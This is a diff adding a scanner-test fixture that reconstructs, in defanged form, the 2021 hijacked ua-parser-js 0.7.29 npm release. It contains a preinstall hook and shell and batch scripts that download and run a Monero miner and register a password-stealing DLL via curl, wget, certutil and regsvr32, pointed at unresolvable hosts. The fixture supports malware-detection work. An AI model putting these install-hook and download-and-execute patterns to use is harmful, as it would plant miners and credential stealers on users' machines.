@@ -1,0 +1,337 @@
+# Defanged reconstruction of a real malicious package, for scanner tests.
+# Never extract and run. See internal/e2e/livescan/corpus.go.
+id: ua-parser-js-0.7.29
+title: "ua-parser-js 0.7.29 (npm): preinstall hook drops a Monero miner and a password stealer"
+campaign: ua-parser-js-2021
+date: "2021-10-22"
+kind: npm
+ecosystem: npm
+name: ua-parser-js
+version: "0.7.29"
+benignVersion: "0.7.28"
+summary: >-
+  ua-parser-js, a user-agent parsing library with about 7 million weekly
+  downloads (reports differ: up to 8 million), was released three times on
+  2021-10-22 from its maintainer's hijacked npm account: 0.7.29, 0.8.0 and
+  1.0.0. The maintainer first noticed his inbox flooded with spam from hundreds
+  of websites and could only deprecate the versions, not unpublish them; they
+  stayed downloadable for about four hours (Rapid7: roughly 12:15 to 16:16-16:26
+  UTC) until 0.7.30, 0.8.1 and 1.0.1 replaced them. By the Mend diff of 0.7.28
+  to 0.7.29 the release changed the version, added one package.json line,
+  "preinstall": "start /B node preinstall.js & node preinstall.js", and added
+  three files. preinstall.js switched on process.platform: Windows ran
+  preinstall.bat through cmd.exe, Linux ran preinstall.sh through bash, macOS
+  got nothing. preinstall.sh asked a geolocation service for the country and
+  exited for Russia, Ukraine, Belarus and Kazakhstan; otherwise it fetched a
+  file named jsextension from a server addressed by IP (curl, then wget) and
+  ran it: an XMRig Monero miner pointed at the MineXMR pool with the
+  attacker's wallet (CloudSEK: capped at about 50% of the CPU). preinstall.bat
+  did the same for jsextension.exe (curl, wget, then certutil), started it
+  unless tasklist showed it running, and also fetched sdd.dll from a second
+  host, saved it as create.dll and ran regsvr32.exe -s create.dll: a password
+  stealer that Mandiant found consistent with DanaBot (Sophos: possibly a
+  DanaBot variant). The hijack was noticed within hours through the spam flood
+  and GitHub issue 536. Mandiant tracks the actor as UNC3379 and ties it to a
+  2021-10-14 test package and the 2021-11-04 coa and rc hijacks (single source).
+techniques: [account-takeover, install-hook, platform-dispatch, geo-fencing, download-and-execute, cryptominer, credential-stealer-dll, living-off-the-land]
+reconstruction: >-
+  package.json differs from the clean 0.7.28 by the version and one added line,
+  the preinstall hook, as in the Mend diff; src/ua-parser.js is the same in both
+  variants (the diff lists no change to it), so it still says 0.7.28.
+  preinstall.js follows the dispatch Mandiant prints (cmd.exe /c
+  preinstall.bat, /bin/bash preinstall.sh, nothing for macOS). preinstall.sh
+  and preinstall.bat keep the sequence Mandiant, Sophos and CERT-EU describe:
+  the geolocation lookup and the RU/UA/BY/KZ exit (Linux only), an
+  already-running check, curl with a wget fallback (certutil as the last resort
+  on Windows, as in the command line a victim posted in issue 536), the miner
+  started in the background with pool, wallet and CPU-cap arguments, and the
+  DLL fetched as sdd.dll, saved as create.dll and registered with regsvr32 -s.
+  Every endpoint is defanged: the geolocation service, the DLL host and the
+  mining pool end in .invalid, and the download server, a bare IP in the
+  original, is an address from 203.0.113.0/24. The wallet is a digit sequence
+  that is not a valid Monero address. No miner binary or DLL exists in the
+  tree, and each download targets an unresolvable address. The miner's argument
+  list is an XMRig command line matching what the sources describe (pool, TLS,
+  keep-alive, wallet, about 50% CPU), because the exact flags were only visible
+  in screenshots. The chmod +x and the pgrep check in preinstall.sh are not
+  printed in the sources read, they are assumed from the described flow (a
+  downloaded file is not executable; the Windows script has the equivalent
+  tasklist check). src/ua-parser.js, the readme and the license are small
+  stand-ins for the real library.
+references:
+  - https://github.com/advisories/GHSA-pjwm-rvh2-c87w
+  - https://github.com/faisalman/ua-parser-js/issues/536
+  - https://cloud.google.com/blog/topics/threat-intelligence/supply-chain-node-js
+  - https://www.sophos.com/en-us/blog/node-poisoning-hijacked-package-delivers-coin-miner-and-credential-stealing-backdoor
+  - https://www.cert.europa.eu/publications/security-advisories/2021-057/
+  - https://www.rapid7.com/blog/post/2021/10/25/npm-library-ua-parser-js-hijacked-what-you-need-to-know/
+  - https://my.diffend.io/npm/ua-parser-js/0.7.28/0.7.29
+  - https://cloudsek.com/threatintelligence/poisoned-library-package-used-to-install-crypto-mining-and-password-stealing-malware
+indicators:
+  - jsextension
+  - citationsherbe.at
+  - start /B node preinstall.js
+  - regsvr32.exe -s create.dll
+-- shared/src/ua-parser.js --
+/*!
+ * UAParser.js v0.7.28
+ * Lightweight JavaScript-based User-Agent string parser
+ * Licensed under the MIT license
+ */
+
+(function (window, undefined) {
+
+    'use strict';
+
+    var LIBVERSION = '0.7.28',
+        EMPTY      = '',
+        MOBILE     = 'mobile',
+        TABLET     = 'tablet';
+
+    // Every rule is [pattern, name]. The version is the last capture group of
+    // the pattern that matched; underscores become dots (iOS and macOS write
+    // 10_15_7).
+    var rules = {
+
+        browser : [
+            [/(edge|edga|edgios|edg)\/([\w\.]+)/i, 'Edge'],
+            [/(opera|opr)\/([\w\.]+)/i, 'Opera'],
+            [/(firefox|fxios)\/([\w\.]+)/i, 'Firefox'],
+            [/(chrome|crios)\/([\w\.]+)/i, 'Chrome'],
+            [/version\/([\w\.]+).+?safari/i, 'Safari'],
+            [/(?:msie |trident.+?; rv:)([\w\.]+)/i, 'IE']
+        ],
+
+        os : [
+            [/windows nt ([\d\.]+)/i, 'Windows'],
+            [/android ([\d\.]+)/i, 'Android'],
+            [/(?:iphone|ipad).+? os ([\d_]+)/i, 'iOS'],
+            [/mac os x ([\d_\.]+)/i, 'Mac OS'],
+            [/linux/i, 'Linux']
+        ]
+    };
+
+    function match(list, ua) {
+        for (var i = 0; i < list.length; i++) {
+            var m = list[i][0].exec(ua);
+            if (m) {
+                var version = m.length > 1 ? m[m.length - 1].replace(/_/g, '.') : undefined;
+                return { name : list[i][1], version : version };
+            }
+        }
+        return { name : undefined, version : undefined };
+    }
+
+    var UAParser = function (uastring) {
+
+        if (!(this instanceof UAParser)) {
+            return new UAParser(uastring).getResult();
+        }
+
+        var ua = uastring || (window && window.navigator ? window.navigator.userAgent : EMPTY);
+
+        this.getUA = function () {
+            return ua;
+        };
+
+        this.setUA = function (uastring) {
+            ua = uastring;
+            return this;
+        };
+
+        this.getBrowser = function () {
+            var browser = match(rules.browser, ua);
+            browser.major = browser.version ? browser.version.split('.')[0] : undefined;
+            return browser;
+        };
+
+        this.getOS = function () {
+            return match(rules.os, ua);
+        };
+
+        this.getDevice = function () {
+            var type;
+            if (ua.search(/ipad|tablet/i) !== -1) {
+                type = TABLET;
+            } else if (ua.search(/mobi|android|iphone/i) !== -1) {
+                type = MOBILE;
+            }
+            return { type : type };
+        };
+
+        this.getResult = function () {
+            return {
+                ua      : ua,
+                browser : this.getBrowser(),
+                os      : this.getOS(),
+                device  : this.getDevice()
+            };
+        };
+
+        return this;
+    };
+
+    UAParser.VERSION = LIBVERSION;
+
+    // export
+    if (typeof exports !== 'undefined') {
+        if (typeof module !== 'undefined' && module.exports) {
+            exports = module.exports = UAParser;
+        }
+        exports.UAParser = UAParser;
+    } else if (window) {
+        window.UAParser = UAParser;
+    }
+
+})(typeof window === 'object' ? window : this);
+-- shared/readme.md --
+# UAParser.js
+
+Lightweight JavaScript-based user-agent string parser. It detects the browser,
+the operating system and the kind of device from a `User-Agent` header.
+
+## Usage
+
+    var UAParser = require('ua-parser-js');
+
+    var parser = new UAParser();
+    parser.setUA('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36');
+
+    parser.getBrowser();  // { name: 'Chrome', version: '90.0.4430.93', major: '90' }
+    parser.getOS();       // { name: 'Windows', version: '10.0' }
+    parser.getDevice();   // { type: undefined }
+    parser.getResult();   // all of the above, plus the user-agent string
+
+Calling `UAParser(ua)` without `new` returns the result object directly.
+-- shared/LICENSE.md --
+MIT License
+
+Copyright (c) 2012-2021 UAParser.js contributors
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+-- benign/package.json --
+{
+  "name": "ua-parser-js",
+  "version": "0.7.28",
+  "title": "UAParser.js",
+  "description": "Lightweight JavaScript-based user-agent string parser",
+  "main": "src/ua-parser.js",
+  "scripts": {
+    "lint": "jshint src/ua-parser.js"
+  },
+  "keywords": [
+    "user-agent",
+    "parser",
+    "browser",
+    "os",
+    "device"
+  ],
+  "license": "MIT"
+}
+-- malicious/package.json --
+{
+  "name": "ua-parser-js",
+  "version": "0.7.29",
+  "title": "UAParser.js",
+  "description": "Lightweight JavaScript-based user-agent string parser",
+  "main": "src/ua-parser.js",
+  "scripts": {
+    "preinstall": "start /B node preinstall.js & node preinstall.js",
+    "lint": "jshint src/ua-parser.js"
+  },
+  "keywords": [
+    "user-agent",
+    "parser",
+    "browser",
+    "os",
+    "device"
+  ],
+  "license": "MIT"
+}
+-- malicious/preinstall.js --
+const { exec } = require("child_process");
+
+function terminalLinux(){
+    exec("/bin/bash preinstall.sh", (error, stdout, stderr) => {
+        if (error) {
+            console.log(`error: ${error.message}`);
+            return;
+        }
+        if (stderr) {
+            console.log(`stderr: ${stderr}`);
+            return;
+        }
+        console.log(`stdout: ${stdout}`);
+    });
+}
+
+var opsys = process.platform;
+if (opsys == "darwin") {
+    opsys = "MacOS";
+} else if (opsys == "win32" || opsys == "win64") {
+    opsys = "Windows";
+    const { spawn } = require('child_process');
+    const bat = spawn('cmd.exe', ['/c', 'preinstall.bat']);
+} else if (opsys == "linux") {
+    opsys = "Linux";
+    terminalLinux();
+}
+-- malicious/preinstall.sh --
+IP=$(curl -k https://freegeoip.app.invalid/xml/ | grep 'RU\|UA\|BY\|KZ')
+
+if [ -z "$IP" ]
+then
+	var=$(pgrep jsextension)
+	if [ -z "$var" ]
+	then
+		curl http://203.0.113.228/download/jsextension -o jsextension
+		if [ ! -f jsextension ]
+		then
+			wget http://203.0.113.228/download/jsextension -O jsextension
+		fi
+		chmod +x jsextension
+		./jsextension -k --tls -o pool.minexmr.com.invalid:443 -u 40123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123 --cpu-max-threads-hint=50 &>/dev/null &
+	fi
+fi
+-- malicious/preinstall.bat --
+@echo off
+curl http://203.0.113.228/download/jsextension.exe -o jsextension.exe
+if not exist jsextension.exe (
+wget http://203.0.113.228/download/jsextension.exe -O jsextension.exe
+)
+if not exist jsextension.exe (
+certutil.exe -urlcache -f http://203.0.113.228/download/jsextension.exe jsextension.exe
+)
+curl https://citationsherbe.at.invalid/sdd.dll -o create.dll
+if not exist create.dll (
+wget https://citationsherbe.at.invalid/sdd.dll -O create.dll
+)
+if not exist create.dll (
+certutil.exe -urlcache -f https://citationsherbe.at.invalid/sdd.dll create.dll
+)
+set exe_1=jsextension.exe
+set "count_1=0"
+>tasklist.temp (
+tasklist /NH /FI "IMAGENAME eq %exe_1%"
+)
+for /f %%x in (tasklist.temp) do (
+if "%%x" EQU "%exe_1%" set /a count_1+=1
+)
+if %count_1% EQU 0 (start /B .\jsextension.exe -k --tls -o pool.minexmr.com.invalid:443 -u 40123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123 --cpu-max-threads-hint=50)
+regsvr32.exe -s create.dll
